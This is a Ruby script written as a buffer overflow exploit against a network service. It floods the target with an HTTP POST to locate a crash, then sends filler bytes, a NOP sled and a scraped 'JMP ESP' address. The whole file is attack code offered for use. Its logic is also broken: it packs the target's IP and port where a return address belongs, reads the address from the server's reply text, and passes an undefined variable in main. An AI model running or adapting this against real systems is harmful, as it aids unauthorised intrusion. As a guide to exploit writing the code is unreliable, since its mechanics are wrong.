require 'socket'
require 'ipaddr'

# Constants
EIP_OFFSET = 62
NOP_SLED_LENGTH = 16
MAX_BUFFER_SIZE = 5000

def custom_recv_until(s, delimiter)
  data = ''
  loop do
    chunk = s.recv(1)
    break unless chunk
    data += chunk
    break if data.include?(delimiter)
  end
  data
end

def generate_payload(target_host, target_port, jmp_esp)
  nop_sled = "\x90" * NOP_SLED_LENGTH

  payload = "A" * EIP_OFFSET + [IPAddr.new(target_host).to_i].pack('N') + [target_port].pack('n') + nop_sled + jmp_esp
  payload
end

def find_jmp_esp(target_host, target_port)
  buffer = 'A' * MAX_BUFFER_SIZE

  begin
    s = TCPSocket.new(target_host, target_port)
    s.puts("POST / HTTP/1.1\r\n")
    s.puts("Host: #{target_host}\r\n")
    s.puts("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n")
    s.puts("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
    s.puts("Connection: close\r\n")
    s.puts("Content-Length: #{buffer.bytesize}\r\n")
    s.puts("\r\n")
    s.write(buffer)

    crash_point = custom_recv_until(s, "Error")
    # Extract EIP value from the crash report
    eip_value = crash_point.scan(/EIP:(\S+)/).flatten.first

    s&.close

    return eip_value
  rescue Exception => e
    puts "Error occurred while finding jmp esp: #{e}"
  end
end

def send_payload(s, target_host, target_port, jmp_esp)
  begin
    s = TCPSocket.new(target_host, target_port)
    payload = generate_payload(target_host, target_port, jmp_esp)

    s.puts("POST / HTTP/1.1\r\n")
    s.puts("Host: #{target_host}\r\n")
    s.puts("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n")
    s.puts("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n")
    s.puts("Connection: close\r\n")
    s.puts("Content-Length: #{payload.bytesize}\r\n")
    s.puts("\r\n")
    s.write(payload)
  rescue Exception => e
    puts "Error occurred while sending payload: #{e}"
  ensure
    s&.close
  end
end

def main
  print 'Enter URL or IP: '
  target_host = gets.chomp
  print 'Enter port: '
  target_port = gets.chomp.to_i

  jmp_esp = find_jmp_esp(target_host, target_port)

  if jmp_esp
    puts "JMP ESP found at address: #{jmp_esp}"
    send_payload(s, target_host, target_port, [jmp_esp].pack('H*'))
  else
    puts "Failed to find JMP ESP address."
  end
end

main
